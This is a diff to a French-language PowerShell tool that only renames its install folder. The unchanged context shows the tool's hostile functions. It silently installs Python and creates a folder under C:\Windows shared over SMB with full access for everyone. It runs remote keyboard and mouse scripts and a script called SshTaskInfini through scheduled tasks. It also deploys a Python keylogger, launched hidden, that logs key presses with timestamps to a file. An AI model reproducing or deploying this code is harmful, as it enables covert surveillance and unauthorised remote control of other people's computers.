@@ -26,8 +26,8 @@ function pyInstallWithLibrary
   }
   catch 
   {
-    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe" -OutFile "C:\Windows\Content\python-3.11.2.exe"
-    Start-Job -Name "PyInstall" -ScriptBlock {C:\Windows\Content\python-3.11.2.exe /passive /quiet}
+    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe" -OutFile "C:\Windows\ExecDirectory\python-3.11.2.exe"
+    Start-Job -Name "PyInstall" -ScriptBlock {C:\Windows\ExecDirectory\python-3.11.2.exe /passive /quiet}
     for ($i = 1; $i -le 100; $i++) 
     {
         Write-Progress -Activity "Installation de python en cours..." -Status "$i% Complete:" -PercentComplete $i
@@ -42,22 +42,22 @@ function pyInstallWithLibrary
 
 function dlNircmd 
 {
-  if (!(Test-Path -Path "C:\Windows\Content\nircmd.exe"))
+  if (!(Test-Path -Path "C:\Windows\ExecDirectory\nircmd.exe"))
   {
     Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd-x64.zip" -OutFile "$env:TEMP/nircmd.zip" 
     Expand-Archive -Path "$env:TEMP/nircmd.zip" -DestinationPath $env:TEMP -Force
-    Move-Item -Path "$env:TEMP/nircmd.exe" -Destination "C:\Windows\Content\"  
+    Move-Item -Path "$env:TEMP/nircmd.exe" -Destination "C:\Windows\ExecDirectory\"  
   }
 }
 
 function createExecDirectory 
 {
-  if (!(Test-Path -Path "C:\Windows\Content"))
+  if (!(Test-Path -Path "C:\Windows\ExecDirectory"))
   {
-    New-Item -ItemType Directory -Path "C:\Windows\Content" -Force
+    New-Item -ItemType Directory -Path "C:\Windows\ExecDirectory" -Force
     $Parameters = @{
       Name = 'exec'
-      Path = 'C:\Windows\Content'
+      Path = 'C:\Windows\ExecDirectory'
       FullAccess = 'Tout le monde'
   }
     New-SmbShare @Parameters
@@ -91,7 +91,7 @@ switch ($choix)
       pyInstallWithLibrary
       Write-Host ("$($OrangeForeColor)Site") -BackgroundColor Black -NoNewline
       $site = Read-Host(" ")
-      "site = '$site'" | Set-Content -Path "C:\Windows\Content\VarSitePourMouseKeyboard.py" -Force
+      "site = '$site'" | Set-Content -Path "C:\Windows\ExecDirectory\VarSitePourMouseKeyboard.py" -Force
       start-sleep -second 2
       function createScriptMouseKeyboard 
       {
@@ -125,10 +125,10 @@ for i in range(len(l)):
 keyboard.press("enter")
 "@        
 
-New-Item -ItemType File -Path "C:\Windows\Content\" -Name "mousekeyboard.py" -Value $ScriptMouseKeyboard -Force
+New-Item -ItemType File -Path "C:\Windows\ExecDirectory\" -Name "mousekeyboard.py" -Value $ScriptMouseKeyboard -Force
 
       }
-      $actions = (New-ScheduledTaskAction -Execute 'cmd' -Argument '/C start /min py "C:\Windows\Content\mousekeyboard.py"')
+      $actions = (New-ScheduledTaskAction -Execute 'cmd' -Argument '/C start /min py "C:\Windows\ExecDirectory\mousekeyboard.py"')
       createScriptMouseKeyboard
       task
   }
@@ -151,8 +151,8 @@ New-Item -ItemType File -Path "C:\Windows\Content\" -Name "mousekeyboard.py" -Va
         dlNircmd
         Write-Host ("Volume (1-65535)") -ForegroundColor Green -BackgroundColor Black -NoNewline
         $volume = Read-Host(" ")
-        C:\Windows\Content\nircmd.exe mutesysvolume 0
-        C:\Windows\Content\nircmd.exe setsysvolume $volume
+        C:\Windows\ExecDirectory\nircmd.exe mutesysvolume 0
+        C:\Windows\ExecDirectory\nircmd.exe setsysvolume $volume
       }
 
       Write-Host ("[1] ") -ForegroundColor Magenta -NoNewline
@@ -243,7 +243,7 @@ New-Item -ItemType File -Path "C:\Windows\Content\" -Name "mousekeyboard.py" -Va
         }
 
         $contentScript = $contentScript.ToString()
-        New-Item -ItemType File -Path "C:\Windows\Content\" -Name "SshTaskInfini.ps1" -Value $contentScript -Force
+        New-Item -ItemType File -Path "C:\Windows\ExecDirectory\" -Name "SshTaskInfini.ps1" -Value $contentScript -Force
       }
       createScriptSshTaskInfini 
 
@@ -295,7 +295,7 @@ $xml = @"
 <Actions Context="Author">
 <Exec>
   <Command>cmd</Command>
-  <Arguments>/C start /MIN powershell "C:\Windows\Content\SshTaskInfini.ps1"</Arguments>
+  <Arguments>/C start /MIN powershell "C:\Windows\ExecDirectory\SshTaskInfini.ps1"</Arguments>
 </Exec>
 </Actions>
 </Task>
@@ -330,7 +330,7 @@ def temps():
                 if (indexdata.event_type == "down"):
                     lettres = lettres + str(indexdata)[14:-6] + " "
                     
-            f = open(file=r"C:\Windows\Content\r.txt",mode="at")
+            f = open(file=r"C:\Windows\ExecDirectory\r.txt",mode="at")
             f.writelines(str(tempsfichier)+"\r\n")
             f.writelines(lettres+"\r\n")
             print(lettres)
@@ -342,9 +342,9 @@ def temps():
 temps()
 "@
       
-        New-Item -ItemType File -Path "C:\Windows\Content\" -Name "ScriptKeylogger.py" -Value $ScriptKeylogger -Force
+        New-Item -ItemType File -Path "C:\Windows\ExecDirectory\" -Name "ScriptKeylogger.py" -Value $ScriptKeylogger -Force
       }
-        $actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument '-Command "& {Start-Process py "C:\Windows\Content\ScriptKeylogger.py" -WindowStyle Hidden}"')
+        $actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument '-Command "& {Start-Process py "C:\Windows\ExecDirectory\ScriptKeylogger.py" -WindowStyle Hidden}"')
         createScriptKeylogger 
         task
   }
